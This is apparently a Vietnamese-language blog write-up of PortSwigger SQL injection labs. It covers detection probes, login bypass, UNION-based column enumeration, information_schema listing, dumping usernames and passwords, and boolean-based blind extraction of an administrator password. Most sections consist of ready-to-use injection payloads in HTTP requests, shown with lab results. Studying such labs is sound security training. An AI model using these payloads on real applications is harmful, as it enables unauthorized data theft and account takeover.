---
title: SQL injection
published: 2025-08-11
description: T√¨m hi·ªÉu v·ªÅ SQL injection.
tags: [sqli, security]
category: PortSwigger
draft: true
cover: '/post-imgs/sqli/sqli.png'
---

# SQL injection l√† g√¨?
**SQL injection** (SQLi) l√† m·ªôt l·ªó h·ªïng b·∫£o m·∫≠t ·ª©ng d·ª•ng cho ph√©p k·∫ª t·∫•n c√¥ng can thi·ªáp v√†o c√°c truy v·∫•n ƒë·ªÉ tr√≠ch xu·∫•t ho·∫∑c thay ƒë·ªïi d·ªØ li·ªáu tr√°i ph√©p nh·∫Øm ƒë·∫øn database.

M·ªôt cu·ªôc t·∫•n c√¥ng SQLi th√†nh c√¥ng s·∫Ω d·∫´n ƒë·∫øn vi·ªác truy c·∫≠p tr√°i ph√©p v√†o c√°c th√¥ng tin nh·∫°y c·∫£m.

# C√°ch ph√°t hi·ªán SQLi
ƒê·ªÉ ph√°t hi·ªán SQLi b·∫°n s·∫Ω th∆∞·ªùng ch√®n c√°c gi√° tr·ªã kh√°c nhau v√†o payload ƒë·ªÉ quan s√°t ph·∫£n h·ªìi c·ªßa ·ª©ng d·ª•ng.

* **K√Ω t·ª± ` ' `**

V√≠ d·ª•:

```sql
GET /product?id=1'
```

``N·∫øu ·ª©ng d·ª•ng b√°o l·ªói ki·ªÉu SQL syntax error, kh·∫£ nƒÉng cao l√† d√≠nh SQLi.``

* **Th·ª≠ payload ƒë·ªÉ k·∫øt qu·∫£ kh√¥ng ƒë·ªïi v√† m·ªôt payload l√†m thay ƒë·ªïi k·∫øt qu·∫£.**

V√≠ d·ª• 

```sql
GET /product?id=1 AND 1=1 --> v·∫´n tr·∫£ v·ªÅ k·∫øt qu·∫£ ban ƒë·∫ßu
GET /product?id=1 AND 1=2 --> tr·∫£ v·ªÅ k·∫øt qu·∫£ kh√°c
```

``N·∫øu c√≥ s·ª± kh√°c bi·ªát gi·ªØa hai ph·∫£n h·ªìi tr√™n th√¨ c√≥ kh·∫£ nƒÉng cao ·ª©ng d·ª•ng d√≠nh SQLi.``

* **Th·ª≠ payload ƒëi·ªÅu ki·ªán Boolean**

V√≠ d·ª•:
```sql
GET /product?id=1 OR 1=1 --> lu√¥n ƒë√∫ng
GET /product?id=1 OR 1=2 --> lu√¥n sai
```

``N·∫øu c√≥ s·ª± kh√°c bi·ªát gi·ªØa hai ph·∫£n h·ªìi tr√™n th√¨ c√≥ kh·∫£ nƒÉng cao ·ª©ng d·ª•ng d√≠nh SQLi.``

* **Th·ª≠ payload ƒë·ªÉ g√¢y ƒë·ªô tr·ªÖ th·ªùi gian**

V√≠ d·ª•:
```sql
' OR SLEEP(10)--
```

``N·∫øu ph·∫£n h·ªìi ch·∫≠m ƒë√∫ng s·ªë gi√¢y ‚Üí kh·∫£ nƒÉng cao l√† l·ªó h·ªïng t·ªìn t·∫°i.``

* **Th·ª≠ payload OAST (Out-of-Band Application Security Testing)**


``G·ª≠i payload khi·∫øn server k·∫øt n·ªëi ra ngo√†i (v√≠ d·ª• v·ªÅ Burp Collaborator).``

``N·∫øu c√≥ k·∫øt n·ªëi ƒë·∫øn server c·ªßa b·∫°n ‚Üí l·ªó h·ªïng x√°c nh·∫≠n.``

> SQLi c√≥ th·ªÉ x·∫£y ra ·ªü b·∫•t k·ª≥ v·ªã tr√≠ n√†o v√† trong c√°c lo·∫°i truy v·∫•n kh√°c.

## L·∫•y d·ªØ li·ªáu ·∫©n
L√† c√°ch khai th√°c l·ªó h·ªïng SQLi ƒë·ªÉ xem c√°c d·ªØ li·ªáu m√† ·ª©ng d·ª•ng c·ªë t√¨nh kh√¥ng hi·ªÉn th·ªã.

B·∫±ng c√°ch thay ƒë·ªïi c√°c truy v·∫•n g·ªëc ƒë·ªÉ tr·∫£ v·ªÅ th√™m c√°c k·∫øt qu·∫£ b·ªï sung.
### V√≠ d·ª•
**Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**

Khi ng∆∞·ªùi d√πng th·ª±c hi·ªán l·ªçc `category` v·ªõi gi√° tr·ªã l√† `Gifts`:

```
https://example.net/filter?category=Gifts
```

<p align="center"><b>ü†ã truy v·∫•n SQL ü†ã</b></p>

```sql
SELECT * FROM products WHERE category='Gifts' AND released = 1;
```

V·ªõi `AND released = 1` l√† c√°c s·∫£n ph·∫©m ƒë√£ ƒë∆∞·ª£c ph√°t h√†nh c√≤n `AND released = 0` s·∫Ω l√† c√°c s·∫£n ph·∫©m ch∆∞a ƒë∆∞·ª£c ph√°t h√†nh.  

N·∫øu thay ƒë·ªïi URL v·ªõi d·∫°ng:

```
https://example.net/filter?category=Gifts'-- 
```

<p align="center"><b>ü†ã truy v·∫•n SQL ü†ã</b></p>

```sql
SELECT * FROM products WHERE category='Gifts'-- ' AND released = 1;
```

V·ªõi truy v·∫•n n√†y t·∫•t c·∫£ s·∫£n ph·∫©m trong `category='Gifts'` s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã t·∫•t c·∫£ d√π ch∆∞a ph√°t h√†nh do `-- ` ƒë∆∞·ª£c ch√®n v√†o ƒë√£ comment ƒëi·ªÅu ki·ªán `AND released = 1`.

V·ªõi m·ªôt tr∆∞·ªùng h·ª£p kh√°c:

```
https://example.net/filter?category=Gifts' OR 1=1 -- 
```

<p align="center"><b>ü†ã truy v·∫•n SQL ü†ã</b></p>

```sql
SELECT * FROM products WHERE category='Gifts' OR 1=1 -- ' AND released = 1;
```

Trong truy v·∫•n n√†y ƒëi·ªÅu ki·ªán `WHERE category='Gifts' OR 1=1` n·∫øu m·ªôt ƒëi·ªÅu ki·ªán OR l√† ƒë√∫ng, th√¨ to√†n b·ªô ƒëi·ªÅu ki·ªán s·∫Ω ƒë√∫ng cho m·ªçi d√≤ng ‚Üí kh√¥ng l·ªçc g√¨ n·ªØa.

C√πng l√∫c ƒë√≥ `-- ` c≈©ng ti·∫øn h√†nh comment di·ªÅu ki·ªán `AND released = 1`. N√™n cu·ªëi c√πng t·∫•t c·∫£ c√°c s·∫£n ph·∫©m c·ªßa `products` s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã to√†n b·ªô.

---

### L·∫≠t ƒë·ªï logic ·ª©ng d·ª•ng
C√πng l√† m·ªôt l·ªó h·ªïng SQLi thay ƒë·ªïi c√°c truy v·∫•n g·ªëc gi·ªëng [L·∫•y d·ªØ li·ªáu ·∫©n](#l·∫•y-d·ªØ-li·ªáu-·∫©n) nh∆∞ng [L·∫≠t ƒë·ªï logic ·ª©ng d·ª•ng](#l·∫≠t-ƒë·ªï-logic-·ª©ng-d·ª•ng) l·∫°i can thi·ªáp v√†o logic c·ªßa ·ª©ng d·ª•ng ƒë·ªÉ ƒë·∫°t ƒë∆∞·ª£c m·ª•c ƒë√≠ch.

### V√≠ d·ª•
**Lab: SQL injection vulnerability allowing login bypass**

Trong ph·∫ßn ƒëƒÉng nh·∫≠p v·ªõi n·ªôi dung:

```yaml
Username: user1
Password: abc123
```
<p align="center"><b>ü†ã truy v·∫•n SQL ü†ã</b></p>

```sql
SELECT * FROM users WHERE username = 'user1' AND password = 'abc123'
```
ƒê·ªÉ ƒëƒÉng nh·∫≠p th√¨ ƒëi·ªÅu ki·ªán `WHERE username = 'user1' AND password = 'abc123'` s·∫Ω ph·∫£i ƒë√∫ng `username` v√† `password`.

Sau ƒë√≥ ta ch·ªâ c·∫ßn s·ª≠a l·∫°i:

```yaml
Username: administrator'-- 
Password: abc123
```

<p align="center"><b>ü†ã truy v·∫•n SQL ü†ã</b></p>

```sql
SELECT * FROM users WHERE username = 'administrator'-- ' AND password = 'abc123'
```
L√† ta c√≥ th·ªÉ ƒëƒÉng nh·∫≠p v√†o t√†i kho·∫£n `administrator` v√† b·ªè qua ƒëi·ªÅu ki·ªán m·∫≠t kh·∫©u.

# T·∫•n c√¥ng SQLi s·ª≠ d·ª•ng m·ªánh ƒë·ªÅ UNION

N·∫øu ·ª©ng d·ª•ng b·ªã SQL Injection v√† hi·ªÉn th·ªã k·∫øt qu·∫£ truy v·∫•n, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ d√πng UNION ƒë·ªÉ gh√©p truy v·∫•n kh√°c v√† l·∫•y d·ªØ li·ªáu t·ª´ b·∫£ng kh√°c.

ƒê·ªÉ s·ª≠ d·ª•ng ƒë∆∞·ª£c `UNION` ph·∫£i ƒë√°p ·ª©ng ƒë∆∞·ª£c 2 y√™u c·∫ßu:

* C√°c truy v·∫•n ri√™ng l·∫ª ph·∫£i tr·∫£ v·ªÅ c√πng s·ªë m·ªôt c·ªôt.

* C√°c lo·∫°i d∆∞ li·ªáu trong m·ªói c·ªôt ph·∫£i t∆∞∆°ng th√≠ch gi·ªØa c√°c truy v·∫•n ri√™ng l·∫ª.

## ƒêi·ªÅu ki·ªán ƒë·ªÉ th·ª±c hi·ªán ƒë∆∞·ª£c m·ªôt cu·ªôc t·∫•n c√¥ng SQLi v·ªõi UNION

### X√°c ƒë·ªãnh c√≥ bao nhi√™u c·ªôt tr·∫£ v·ªÅ trong truy v·∫•n g·ªëc

C√≥ 2 c√°ch ƒë·ªÉ x√°c ƒë·ªãnh s·ªë l∆∞·ª£ng c·ªôt trong truy v·∫•n g·ªëc:

* ORDER BY: TƒÉng d·∫ßn s·ªë c·ªôt (ORDER BY 1, ORDER BY 2...) cho ƒë·∫øn khi l·ªói ‚Üí bi·∫øt s·ªë c·ªôt.

* UNION SELECT NULL: Th·ª≠ s·ªë NULL kh√°c nhau, khi kh·ªõp s·ªë c·ªôt ‚Üí payload ch·∫°y OK.

### V√≠ d·ª•
**Lab: SQL injection UNION attack, determining the number of columns returned by the query**
C√°ch 1: ORDER BY

```http
GET /filter?category=Accessories'ORDER BY 1--  //200 OK
GET /filter?category=Accessories'ORDER BY 2--  //200 OK
GET /filter?category=Accessories'ORDER BY 3--  //200 OK
GET /filter?category=Accessories'ORDER BY 4--  //500 Internal Server Error
```

Suy ra s·ªë l∆∞·ª£ng c·ªôt ·ªü truy v·∫•n g·ªëc l√† `3`.

C√°ch 2: UNION SELECT NULL

```http
GET /filter?category=Accessories'UNION SELECT NULL--                 //500 Internal Server Error
GET /filter?category=Accessories'UNION SELECT NULL,NULL--            //500 Internal Server Error
GET /filter?category=Accessories'UNION SELECT NULL,NULL,NULL--       //200 OK
GET /filter?category=Accessories'UNION SELECT NULL,NULL,NULL,NULL--  //500 Internal Server Error
```

Suy ra s·ªë l∆∞·ª£ng c·ªôt ·ªü truy v·∫•n g·ªëc l√† `3`.

### C·ªôt n√†o trong truy v·∫•n g·ªëc c√≥ ki·ªÉu d·ªØ li·ªáu ph√π h·ª£p ƒë·ªÉ ch·ª©a d·ªØ li·ªáu t·ª´ truy v·∫•n ch√®n th√™m

Sau khi x√°c ƒë·ªãnh ƒë∆∞·ª£c s·ªë c·ªôt tr·∫£ v·ªÅ t·ª´ truy v·∫•n g·ªëc ta s·∫Ω ti·∫øn h√†nh ch√®n `'string'` v√†o t·ª´ng c·ªôt (c√°c c·ªôt kh√°c ƒë·ªÉ `NULL`) ‚Üí n·∫øu hi·ªán `'string'` v√† kh√¥ng l·ªói ‚Üí c·ªôt ƒë√≥ ch·ª©a ho·∫∑c ch·∫•p nh·∫≠n d·ªØ li·ªáu chu·ªói, c√≥ th·ªÉ d√πng ƒë·ªÉ l·∫•y d·ªØ li·ªáu text.

### V√≠ d·ª•
**Lab: SQL injection UNION attack, finding a column containing text**

Sau khi ti·∫øn h√†nh x√°c ƒë·ªãnh s·ªë c·ªôt c·ªßa truy v·∫•n g·ªëc ta s·∫Ω bi·∫øt ƒë∆∞·ª£c s·ªë c·ªôt g·ªëc l√† `3`.

 ```http
 GET /filter?category=Accessories'UNION SELECT NULL,NULL,NULL--       //200 OK
Ti·∫øn h√†nh ch√®n 'abc' v√†o c√°c c·ªôt NULL.
GET /filter?category=Accessories'UNION SELECT 'abc',NULL,NULL--       //500 Internal Server Error
GET /filter?category=Accessories'UNION SELECT NULL,'abc',NULL--       //200 OK
GET /filter?category=Accessories'UNION SELECT NULL,NULL,'abc'--       //500 Internal Server Error
 ```

 Suy ra t·∫°i c·ªôt `2` ch·ª©a ho·∫∑c ch·∫•p nh·∫≠n d·ªØ li·ªáu chu·ªói, c√≥ th·ªÉ d√πng ƒë·ªÉ l·∫•y d·ªØ li·ªáu text.

 ## Th·ª±c hi·ªán m·ªôt cu·ªôc t·∫•n c√¥ng SQLi ƒë·∫ßy d·ªß v·ªõi UNION
**Lab: SQL injection UNION attack, retrieving data from other tables**

* X√°c ƒë·ªãnh s·ªë c·ªôt tr·∫£ v·ªÅ trong truy v·∫•n g·ªëc

 ```http
GET /filter?category=Accessories' UNION SELECT NULL--            //500 Internal Server Error
GET /filter?category=Accessories' UNION SELECT NULL,NULL--       //200 OK
GET /filter?category=Accessories' UNION SELECT NULL,NULL,NULL--  //500 Internal Server Error
 ```

 S·ªë c·ªôt b·∫±ng `2`.

* X√°c ƒë·ªãnh ki·ªÉu d·ªØ li·ªáu c·ªßa c√°c c·ªôt

 ```http
GET /filter?category=Accessories' UNION SELECT 'abc',NULL--       //200 OK
GET /filter?category=Accessories' UNION SELECT NULL,'abc'--       //200 OK
```

C·∫£ `2` c·ªôt ƒë·ªÅu ch·ª©a ho·∫∑c ch·∫•p nh·∫≠n d·ªØ li·ªáu chu·ªói.

* T·∫•n c√¥ng ƒë·ªÉ truy xu·∫•t d·ªØ li·ªáu `username`, `password` t·ª´ b·∫£ng `users`.

```http
GET /filter?category=Accessories' UNION SELECT username,password FROM users-- 
```

V√† ta c√≥ ƒë∆∞·ª£c th√¥ng tin ƒëƒÉng nh·∫≠p `username: administrator`, `password: ho06o0hazcl4cqupdtaf`.

## L·∫•y nhi·ªÅu gi√° tr·ªã trong m·ªôt c·ªôt

N·∫øu truy v·∫•n ch·ªâ tr·∫£ v·ªÅ 1 c·ªôt, h√£y n·ªëi nhi·ªÅu gi√° tr·ªã l·∫°i b·∫±ng to√°n t·ª≠ n·ªëi chu·ªói v√† th√™m k√Ω t·ª± ph√¢n t√°ch (vd. ~) ƒë·ªÉ ph√¢n bi·ªát.

You can concatenate together multiple strings to make a single string. 

```sql
Oracle    	'foo'||'bar'
Microsoft 	'foo'+'bar'
PostgreSQL 	'foo'||'bar'
MySQL     	'foo' 'bar' [L∆∞u √Ω kho·∫£ng tr·ªëng gi·ªØa hai chu·ªói]
            CONCAT('foo','bar')
```

### V√≠ d·ª•

**Lab: SQL injection UNION attack, retrieving multiple values in a single column**

* X√°c ƒë·ªãnh s·ªë c·ªôt tr·∫£ v·ªÅ trong truy v·∫•n g·ªëc

 ```http
GET /filter?category=Accessories' UNION SELECT NULL--            //500 Internal Server Error
GET /filter?category=Accessories' UNION SELECT NULL,NULL--       //200 OK
GET /filter?category=Accessories' UNION SELECT NULL,NULL,NULL--  //500 Internal Server Error
 ```

 S·ªë c·ªôt b·∫±ng `2`.

* X√°c ƒë·ªãnh ki·ªÉu d·ªØ li·ªáu c·ªßa c√°c c·ªôt

 ```http
GET /filter?category=Accessories' UNION SELECT 'abc',NULL--       //500 Internal Server Error
GET /filter?category=Accessories' UNION SELECT NULL,'abc'--       //200 OK
```

C·ªôt `2` ch·ª©a ho·∫∑c ch·∫•p nh·∫≠n d·ªØ li·ªáu chu·ªói.

* T·∫•n c√¥ng ƒë·ªÉ truy xu·∫•t d·ªØ li·ªáu `username`, `password` t·ª´ b·∫£ng `users` b·∫±ng c√°ch n·ªëi 2 chu·ªói `username` v√† `password` th√†nh m·ªôt v√† hi·ªÉn th·ªã trong c·ªôt `2`.

```http
GET /filter?category=Accessories' UNION SELECT NULL,username||'~'||password FROM users-- 
```

V√† ta c√≥ ƒë∆∞·ª£c th√¥ng tin ƒëƒÉng nh·∫≠p `administrator~8117jw3c5i6exwn3xtv2`.

# Ki·ªÉm tra c∆° s·ªü d·ªØ li·ªáu trong c√°c cu·ªôc t·∫•n c√¥ng SQLi

ƒê·ªÉ khai th√°c l·ªó h·ªïng SQL injection, th∆∞·ªùng c·∫ßn t√¨m th√¥ng tin v·ªÅ c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm:

* Lo·∫°i v√† phi√™n b·∫£n c·ªßa ph·∫ßn m·ªÅm c∆° s·ªü d·ªØ li·ªáu.

* C√°c b·∫£ng v√† c·ªôt m√† c∆° s·ªü d·ªØ li·ªáu ƒëang ch·ª©a.

## Truy v·∫•n lo·∫°i c∆° s·ªü d·ªØ li·ªáu v√† phi√™n b·∫£n.

```sql
Microsoft, MySQL ‚Üí SELECT @@version
Oracle           ‚Üí SELECT * FROM v$version
PostgreSQL       ‚Üí SELECT version()
```

### V√≠ d·ª•
**Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft**
* X√°c ƒë·ªãnh s·ªë c·ªôt tr·∫£ v·ªÅ trong truy v·∫•n g·ªëc

 ```http
GET /filter?category=Accessories' UNION SELECT NULL#            //500 Internal Server Error
GET /filter?category=Accessories' UNION SELECT NULL,NULL#       //200 OK
GET /filter?category=Accessories' UNION SELECT NULL,NULL,NULL#  //500 Internal Server Error
//S·ª≠ dung # thay cho --  do ·ª©ng d·ª•ng ƒë√£ fix -- 
 ```

 S·ªë c·ªôt b·∫±ng `2`.

* X√°c ƒë·ªãnh ki·ªÉu d·ªØ li·ªáu c·ªßa c√°c c·ªôt

 ```http
GET /filter?category=Accessories' UNION SELECT 'abc',NULL#       //200 OK
GET /filter?category=Accessories' UNION SELECT NULL,'abc'#       //200 OK
```

C·∫£ `2` c·ªôt ƒë·ªÅu ch·ª©a ho·∫∑c ch·∫•p nh·∫≠n d·ªØ li·ªáu chu·ªói.

* T·∫•n c√¥ng ƒë·ªÉ truy xu·∫•t d·ªØ li·ªáu v·ªÅ ki·ªÉu v√† phi√™n b·∫£n database

 ```http
GET /filter?category=Accessories' UNION SELECT @@version,NULL#       //200 OK
```

K·∫øt qu·∫£ ƒë·∫°t ƒë∆∞·ª£c l√† `8.0.42-0ubuntu0.20.04.1`.

## Li·ªát k√™ n·ªôi dung c·ªßa c∆° s·ªü d·ªØ li·ªáu

H·∫ßu h·∫øt c√°c lo·∫°i c∆° s·ªü d·ªØ li·ªáu (tr·ª´ Oracle) ƒë·ªÅu c√≥ m·ªôt t·∫≠p h·ª£p c√°c view g·ªçi l√† information schema. View n√†y cung c·∫•p th√¥ng tin v·ªÅ c∆° s·ªü d·ªØ li·ªáu.

* Truy v·∫•n li·ªát k√™ c√°c b·∫£ng trong c∆° s·ªü d·ªØ li·ªáu s·∫Ω c√≥ ƒë·∫ßu ra tr·∫£ v·ªÅ nh∆∞ sau:

TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME   | TABLE_TYPE
--------------|--------------|--------------|--------------
MyDatabase    | dbo          | Products     | BASE TABLE
MyDatabase    | dbo          | Users        | BASE TABLE
MyDatabase    | dbo          | Feedback     | BASE TABLE

* Truy v·∫•n li·ªát k√™ c√°c c·ªôt trong b·∫£ng ri√™ng l·∫ª s·∫Ω c√≥ ƒë·∫ßu ra tr·∫£ v·ªÅ nh∆∞ sau:

TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME   | COLUMN_NAME  | DATA_TYPE
--------------|--------------|--------------|--------------|--------------
MyDatabase    | dbo          | Users        | UserId       | int
MyDatabase    | dbo          | Users        | Username     | varchar
MyDatabase    | dbo          | Users        | Password     | varchar

```sql
Oracle 	    SELECT * FROM all_tables
            SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
Microsoft 	SELECT * FROM information_schema.tables
            SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
PostgreSQL 	SELECT * FROM information_schema.tables
            SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
MySQL     	SELECT * FROM information_schema.tables
            SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

## V√≠ d·ª•
**Lab: SQL injection attack, listing the database contents on non-Oracle databases**

* X√°c ƒë·ªãnh s·ªë c·ªôt tr·∫£ v·ªÅ trong truy v·∫•n g·ªëc

 ```http
GET /filter?category=Accessories' UNION SELECT NULL--            //500 Internal Server Error
GET /filter?category=Accessories' UNION SELECT NULL,NULL--       //200 OK
GET /filter?category=Accessories' UNION SELECT NULL,NULL,NULL--  //500 Internal Server Error
 ```

 S·ªë c·ªôt b·∫±ng `2`.

* X√°c ƒë·ªãnh ki·ªÉu d·ªØ li·ªáu c·ªßa c√°c c·ªôt

 ```http
GET /filter?category=Accessories' UNION SELECT 'abc',NULL--       //200 OK
GET /filter?category=Accessories' UNION SELECT NULL,'abc'--       //200 OK
```

C·∫£ `2` c·ªôt ch·ª©a ho·∫∑c ch·∫•p nh·∫≠n d·ªØ li·ªáu chu·ªói.

* X√°c ƒë·ªãnh `TABLE_NAME` c·ªßa c∆° s·ªü d·ªØ li·ªáu.

```sql
GET /filter?category=' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables-- 
```
T√¨m ƒë∆∞·ª£c `TABLE_NAME: users_fdpkec`

* X√°c ƒë·ªãnh `COLUMN_NAME` trong `TABLE_NAME: users_fdpkec`

```sql
GET /filter?category=' UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE TABLE_NAME = 'users_fdpkec'-- 
```

T√¨m ƒë∆∞·ª£c `COLUMN_NAME: email, password_qhnrxp, username_dcllzy`.

* L·∫•y c√°c gi√° tr·ªã `COLUMN_NAME: password_qhnrxp, username_dcllzy` t·ª´ `TABLE_NAME: users_fdpkec`

```sql
GET /filter?category=' UNION SELECT username_dcllzy,password_qhnrxp FROM users_fdpkec-- 
```

Ta t√¨m ƒë∆∞·ª£c th√¥ng tin ƒëƒÉng nh·∫≠p `username_dcllzy: administrator, password_qhnrxp: k5kvgcc1savepgo282j8`.

# SQLi m√π
SQLi m√π l√† khi ·ª©ng d·ª•ng b·ªã SQLi nh∆∞ng kh√¥ng hi·ªÉn th·ªã k·∫øt qu·∫£ ho·∫∑c l·ªói t·ª´ CSDL.

* UNION‚Ä¶ kh√¥ng hi·ªáu qu·∫£ v√¨ kh√¥ng th·∫•y d·ªØ li·ªáu tr·∫£ v·ªÅ.

* V·∫´n khai th√°c ƒë∆∞·ª£c nh∆∞ng ph·∫£i d√πng k·ªπ thu·∫≠t kh√°c (vd. boolean-based, time-based).

## Khai th√°c SQL SQL m√π b·∫±ng c√°ch k√≠ch ho·∫°t c√°c ph·∫£n ·ª©ng c√≥ ƒëi·ªÅu ki·ªán
Khai th√°c SQL SQL m√π b·∫±ng c√°ch k√≠ch ho·∫°t c√°c ph·∫£n ·ª©ng c√≥ ƒëi·ªÅu ki·ªán l√† k·ªπ thu·∫≠t SQLi m√π m√† k·∫ª t·∫•n c√¥ng d·ª±a v√†o s·ª± kh√°c bi·ªát trong ph·∫£n h·ªìi c·ªßa ·ª©ng d·ª•ng khi ƒëi·ªÅu ki·ªán trong truy v·∫•n l√† ƒê√öNG ho·∫∑c SAI ƒë·ªÉ suy lu·∫≠n d·ªØ li·ªáu.

**Lab: Blind SQL injection with conditional responses**
Gi·∫£ x·ª≠ ta c√≥ m·ªôt chu·ªói `Cookie: TrackingId=abcdefghijklm` th√¨ ta s·∫Ω c√≥ c√¢u truy v·∫•n nh∆∞ sau:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'abcdefghijklm'
```

Ti·∫øn h√†nh khai th√°c c√≥ ƒëi·ªÅu ki·ªán v·ªõi `TrackingId`.

```http
Cookie: TrackingId=abcdefghijklm' AND 1=1-- //ƒêi·ªÅu ki·ªán ƒë√∫ng ==> K·∫øt qu·∫£ tr·∫£ v·ªÅ c√≥ "Welcome back"
Cookie: TrackingId=abcdefghijklm' AND 1=2-- //ƒêi·ªÅu ki·ªán sai ==> K·∫øt qu·∫£ tr·∫£ v·ªÅ kh√¥ng c√≥ "Welcome back"
```
Suy ra n·∫øu thay ƒëi·ªÅu ki·ªán `1=1` b·∫±ng m·ªôt d·ªØ li·ªáu h·ªØu √≠ch cho vi·∫øt t·∫•n c√¥ng th√¨ ta s·∫Ω bi·∫øt ƒë∆∞·ª£c n·∫øu d·ªØ li·ªáu ƒë√∫ng th√¨ s·∫Ω c√≥ `'Welcome back'` v√† ng∆∞·ª£c l·∫°i th√¨ kh√¥ng.

```http
Cookie: TrackingId=abcdefghijklm' AND SUBSTRING((SELECT username FROM users WHERE username='administrator'),1,13)='administrator
==> C√≥ tr·∫£ v·ªÅ "Welcome back"
```

Suy ra c√≥ t·ªìn t·∫°i `username='administrator'`.

D√≤ ƒë·ªô d√†i c·ªßa `password`

```http
Cookie: TrackingId=aPB8inszaqNX0Lkj'  AND (SELECT  LENGTH(password) FROM users WHERE username='administrator')=19-- //Welcome back
Cookie: TrackingId=aPB8inszaqNX0Lkj'  AND (SELECT  LENGTH(password) FROM users WHERE username='administrator')=20-- //Welcome back
Cookie: TrackingId=aPB8inszaqNX0Lkj'  AND (SELECT  LENGTH(password) FROM users WHERE username='administrator')=21-- //Kh√¥ng c√≥ Welcome back
```
Suy ra ƒë·ªô d√†i c·ªßa m·∫≠t kh·∫©u s·∫Ω l√† `20`.

D√≤ t·ª´ v·ªã tr√≠ 1 - 20 c·ªßa password v·ªõi c√°c kh·∫£ nƒÉng 1-9, a-z.

```http
Cookie: TrackingId=abcdefghijklm' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a
...
Cookie: TrackingId=abcdefghijklm' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='z

Cookie: TrackingId=abcdefghijklm' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='1
...
Cookie: TrackingId=abcdefghijklm' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='9
```

ƒê·ªëi v·ªõi t·ª´ng v·ªã tr√≠ t·ª´ `1-20` n·∫øu tr∆∞·ªùng h·ª£p n√†o c√≥ `'Welcome back'` th√¨ ƒë√≥ ch√≠nh l√† gi√° tr·ªã c·ªßa v·ªã tr√≠ ƒë√≥ trong `password`.

(C√≥ th·ªÉ s·ª≠ d·ª•ng Burp Suite Intruder ho·∫∑c vi·∫øt m·ªôt script ƒë·ªÉ brute force password)
